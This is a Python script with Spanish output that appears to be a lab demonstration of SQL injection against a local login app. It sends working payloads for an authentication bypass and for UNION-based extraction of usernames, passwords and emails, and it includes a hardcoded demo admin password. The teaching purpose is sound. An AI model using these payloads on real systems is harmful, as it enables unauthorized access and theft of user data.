import requests
import time

DESTINO = "http://127.0.0.1:5000"

def probar_acceso_normal():
    """Prueba de acceso con credenciales válidas"""
    print("\n" + "="*50)
    print("PRUEBA 1: Acceso con credenciales VÁLIDAS")
    print("="*50)
    respuesta = requests.post(DESTINO, data={
        "username": "admin",
        "password": "Admin123!"
    })
    if "Acceso CONCEDIDO" in respuesta.text:
        print("[✓] Acceso exitoso — comportamiento normal")
    else:
        print("[✗] Fallo inesperado")

def probar_bypass_autenticacion():
    """Payload clásico: bypass de inicio de sesión"""
    print("\n" + "="*50)
    print("PRUEBA 2: Bypass de Autenticación con SQLi")
    print("PAYLOAD: ' OR '1'='1'; --")
    print("="*50)

    payload_usuario = "' OR '1'='1'; --"
    payload_clave = "cualquier_cosa"

    consulta_final = f"SELECT * FROM users WHERE username = '{payload_usuario}' AND password = '{payload_clave}'"
    print(f"[!] Consulta generada:\n{consulta_final}\n")

    respuesta = requests.post(DESTINO, data={
        "username": payload_usuario,
        "password": payload_clave
    })

    if "Acceso CONCEDIDO" in respuesta.text:
        print("[⚠] VULNERABILIDAD CONFIRMADA — Se obtuvo acceso sin credenciales")
    else:
        print("[✓] Sistema protegido — ataque bloqueado")

def probar_extraccion_datos():
    """Intento de listar todos los usuarios"""
    print("\n" + "="*50)
    print("PRUEBA 3: Extracción de registros")
    print("PAYLOAD: ' UNION SELECT 1,username,password,email FROM users; --")
    print("="*50)

    payload = "' UNION SELECT id,username,password,email FROM users; --"

    respuesta = requests.post(DESTINO, data={
        "username": payload,
        "password": "clave_irrelevante"
    })

    if "admin@empresa.ec" in respuesta.text or "usuario1" in respuesta.text:
        print("[⚠] EXTRACCIÓN EXITOSA — Se filtraron datos confidenciales")
        print("[!] Datos visibles en la respuesta:", respuesta.text[:300])
    else:
        print("[✓] Sistema protegido — no se filtraron datos")

if __name__ == "__main__":
    print("="*50)
    print("  SIMULACIÓN DE ATAQUE — INYECCIÓN SQL")
    print(f"  Objetivo: {DESTINO}")
    print("  ⚠ SOLO para entorno de laboratorio autorizado")
    print("="*50)

    time.sleep(1)
    probar_acceso_normal()
    time.sleep(1)
    probar_bypass_autenticacion()
    time.sleep(1)
    probar_extraccion_datos()

    print("\n" + "="*50)
    print("FIN DE PRUEBAS — Compare resultados con versión segura")
    print("="*50)

